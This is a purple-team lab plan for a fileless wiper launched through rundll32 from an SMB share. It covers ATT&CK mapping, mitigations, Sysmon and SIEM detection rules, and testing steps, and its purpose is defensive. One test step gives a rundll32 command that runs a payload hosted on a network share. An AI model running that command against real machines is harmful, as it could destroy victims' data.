

# Purple Team Defensive Setup & Detection Plan for Fileless Wiper via rundll32 + Net Share

---

## 1. Attack Vector Breakdown

| Attack Step                       | Technique (MITRE ATT\&CK)                                            | Description                                                 |
| --------------------------------- | -------------------------------------------------------------------- | ----------------------------------------------------------- |
| **Fileless Payload Delivery**     | T1564.001 - Hide Artifacts: Hidden Files                             | Payload embedded in JPG, decoded in memory                  |
| **Remote File Execution**         | T1021.002 - Remote Services: SMB/Windows Admin Shares                | Execution via `rundll32.exe` pointing to a remote net share |
| **Process Execution**             | T1059.003 - Command and Scripting Interpreter: Windows Command Shell | `rundll32.exe` execution running payload                    |
| **Data Destruction (Wiper)**      | T1485 - Data Destruction                                             | Overwriting data on disk via memory payload                 |
| **Persistence & Defense Evasion** | T1070 - Indicator Removal on Host                                    | Potential log tampering, clearing events                    |

---

## 2. Mitigations to Deploy in Lab Environment

### 2.1 Network & Share Access Controls

* **Limit SMB share permissions** to restrict write/execute from unauthorized accounts.
* **Disable Admin Shares (C\$, ADMIN\$)** if not needed.
* **Network segmentation:** isolate your file servers and endpoints with VLANs and firewall rules.
* **SMB Signing enforcement** to prevent tampering.

### 2.2 Endpoint Protection

* **Block or monitor `rundll32.exe` launching from network paths.**
* **Implement Application Control (AppLocker / Windows Defender Application Control)** policies restricting execution paths for `rundll32.exe`.
* **Enable Windows Defender Exploit Guard** to restrict suspicious process injections and script execution.
* **Disable unneeded scripting hosts** (cscript, wscript) and restrict PowerShell with constrained language mode.

### 2.3 Logging & Audit Policies

* Enable **Audit Process Creation** with command line logging (`Sysmon Event ID 1`).
* Enable **Audit File Share Access** on your SMB server (Windows Security log Event IDs 5140 for share access).
* Enable **Audit Handle Manipulation and File Deletion** (`Sysmon Event ID 10`).
* Enable **Object Access Auditing** for critical files and folders targeted by the wiper.

---

## 3. Detection Rules & Log Monitoring

### 3.1 Sysmon Detection Rules (Extend from prior config)

Add detection for `rundll32.exe` launching from network paths:

```xml
<ProcessCreate onmatch="include">
  <Image condition="end with">rundll32.exe</Image>
  <CommandLine condition="contains">\\</CommandLine> <!-- Network path -->
</ProcessCreate>
```

Detect unusual file accesses on net shares:

```xml
<FileCreate onmatch="include">
  <TargetFilename condition="contains">\\</TargetFilename>
</FileCreate>
```

Detect process injection or memory tampering:

```xml
<ProcessAccess onmatch="include">
  <GrantedAccess condition="contains">0x1F0FFF</GrantedAccess> <!-- Full access -->
</ProcessAccess>
```

---

### 3.2 Windows Event IDs to Monitor

| Event ID | Source                              | Description                           |
| -------- | ----------------------------------- | ------------------------------------- |
| 1        | Sysmon                              | Process Creation (with cmd line)      |
| 10       | Sysmon                              | Process Access (injection)            |
| 5140     | Microsoft-Windows-Security-Auditing | Network share object accessed         |
| 4656     | Microsoft-Windows-Security-Auditing | Handle to an object requested         |
| 4663     | Microsoft-Windows-Security-Auditing | File/Folder access or deletion        |
| 1102     | Microsoft-Windows-EventLog          | Event log cleared (indicator removal) |

---

## 4. Sample Detection Logic for SIEM or ELK

```yaml
- name: Detect rundll32 execution with network path payload
  condition: and
  conditions:
    - event_id: 1
    - process_name: rundll32.exe
    - command_line_contains: '\\\\' # double backslash for network share path

- name: Detect suspicious SMB share file creation
  condition: and
  conditions:
    - event_id: 11 or 4663
    - target_filename_contains: '\\\\'  # file created on network share

- name: Detect event log clearing
  condition: event_id == 1102

- name: Detect process injection or handle manipulation
  condition: event_id == 10 and granted_access == "0x1F0FFF"
```

---

## 5. Purple Team Testing Steps

1. **Deploy your fileless wiper payload embedded in JPG** on the SMB share accessible to Windows 11 VM.
2. From Kali or attacker VM, remotely trigger execution with:

   ```powershell
   rundll32.exe \\10.10.10.20\share\wiper_payload.jpg,EntryPoint
   ```
3. Monitor Windows 11 VM with Sysmon logs and Security Event logs for matches against above detections.
4. Verify if data destruction occurs and if detection/alerts trigger in your SIEM or log monitoring stack.
5. Adjust mitigations or detection tuning based on observed gaps.
6. Test log integrity and event clearing attempts by wiper payload.

---

## 6. Additional Notes

* Consider using **Sysmon’s `Event ID 17` (Pipe Created) and `Event ID 8` (CreateRemoteThread)** to catch more advanced process injection or IPC techniques often used by fileless payloads.
* Test **Windows Defender ATP or EDR solutions** if available for behavioral detections on `rundll32.exe` activity.
* Monitor **network traffic for SMB anomalies or suspicious connection spikes** with network sensors or Zeek/Bro on your Kali VM.


